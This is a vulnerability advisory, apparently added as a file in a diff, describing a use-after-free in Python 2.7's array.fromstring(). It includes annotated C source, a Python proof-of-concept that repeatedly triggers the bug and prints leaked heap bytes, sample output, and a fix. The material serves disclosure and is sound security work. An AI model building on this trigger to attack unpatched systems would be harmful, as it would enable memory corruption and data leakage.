@@ -1,0 +1,107 @@
+Title: Python 2.7 array.fromstring Use After Free
+Credit: John Leitch (john@autosectools.com)
+Url1: http://autosectools.com/Page/Python-array-fromstring-Use-After-Free
+Url2: http://bugs.python.org/issue24613
+Resolution: Fixed
+
+The Python 2.7 array.fromstring() method suffers from a use after free caused by unsafe realloc use. The issue is triggered when an array is concatenated to itself via fromstring() call:
+
+static PyObject *
+array_fromstring(arrayobject *self, PyObject *args)
+{
+    char *str;
+    Py_ssize_t n;
+    int itemsize = self->ob_descr->itemsize;
+    if (!PyArg_ParseTuple(args, "s#:fromstring", &str, &n)) <<<< The str buffer is parsed from args. In cases where an array is passed to itself, self->ob_item == str.
+        return NULL;
+    if (n % itemsize != 0) {
+        PyErr_SetString(PyExc_ValueError,
+                   "string length not a multiple of item size");
+        return NULL;
+    }
+    n = n / itemsize;
+    if (n > 0) {
+        char *item = self->ob_item; <<<< If str == self->ob_item, item == str.
+        if ((n > PY_SSIZE_T_MAX - Py_SIZE(self)) ||
+            ((Py_SIZE(self) + n) > PY_SSIZE_T_MAX / itemsize)) {
+                return PyErr_NoMemory();
+        }
+        PyMem_RESIZE(item, char, (Py_SIZE(self) + n) * itemsize); <<<< A realloc call occurs here with item passed as the ptr argument. Because realloc sometimes calls free(), this means that item may be freed. If item was equal to str, str is now pointing to freed memory.
+        if (item == NULL) {
+            PyErr_NoMemory();
+            return NULL;
+        }
+        self->ob_item = item;
+        Py_SIZE(self) += n;
+        self->allocated = Py_SIZE(self);
+        memcpy(item + (Py_SIZE(self) - n) * itemsize,
+               str, itemsize*n); <<<< If str is dangling at this point, a use after free occurs here.
+    }
+    Py_INCREF(Py_None);
+    return Py_None;
+}
+
+In most cases when this occurs, the function behaves as expected; while the dangling str pointer is technically pointing to deallocated memory, given the timing it is highly likely the memory contains the expected data. However, ocassionally, an errant allocation will occur between the realloc and memcpy, leading to unexpected contents in the str buffer.
+
+In applications that expose otherwise innocuous indirect object control of arrays as attack surface, it may be possible for an attacker to trigger the corruption of arrays. This could potentially be exploited to exfiltrate data or achieve privilege escalation, depending on subsequent operations performed using corrupted arrays.
+
+A proof-of-concept follows:
+
+import array
+import sys
+import random
+
+testNumber = 0
+
+def dump(value):
+    global testNumber
+    i = 0
+    for x in value:
+        y = ord(x)
+        if (y != 0x41): 
+            end = ''.join(value[i:]).index('A' * 0x10)
+            sys.stdout.write("%08x a[%08x]: " % (testNumber, i))
+            for z in value[i:i+end]: sys.stdout.write(hex(ord(z))[2:])
+            sys.stdout.write('\r\n')
+            break            
+        i += 1
+
+def copyArray():
+    global testNumber
+    while True:
+        a=array.array("c",'A'*random.randint(0x0, 0x10000))
+        a.fromstring(a)
+        dump(a)
+        testNumber += 1
+    
+print "Starting..."    
+copyArray()
+
+The script repeatedly creates randomly sized arrays filled with 0x41, then calls fromstring() and checks the array for corruption. If any is found, the relevant bytes are written to the console as hex. The output should look something like this:
+
+Starting...
+00000007 a[00000cdc]: c8684d0b0f54c0
+0000001d a[0000f84d]: b03f4f0b8be620
+00000027 a[0000119f]: 50724d0b0f54c0
+0000004c a[00000e53]: b86b4d0b0f54c0
+0000005a a[000001e1]: d8ab4609040620
+00000090 a[0000015b]: 9040620104e5f0
+0000014d a[000002d6]: 10ec620d8ab460
+00000153 a[000000f7]: 9040620104e5f0
+0000023c a[00000186]: 50d34c0f8b65a0
+00000279 a[000001c3]: d8ab4609040620
+000002ee a[00000133]: 9040620104e5f0
+000002ff a[00000154]: 9040620104e5f0
+0000030f a[00000278]: 10ec620d8ab460
+00000368 a[00000181]: 50d34c0f8b65a0
+000003b2 a[0000005a]: d0de5f0d05e5f0
+000003b5 a[0000021c]: b854d00d3620
+00000431 a[000001d8]: d8ab4609040620
+0000044b a[000002db]: 10ec620d8ab460
+00000461 a[000000de]: 9040620104e5f0
+000004fb a[0000232f]: 10f74d0c0ce620
+00000510 a[0000014a]: 9040620104e5f0
+
+In some applications, such as those that are web-based, similar circumstances may manifest that would allow for remote exploitation.
+
+To fix the issue, array_fromstring should check if self->ob_item is pointing to the same memory as str, and handle the copy accordingly.
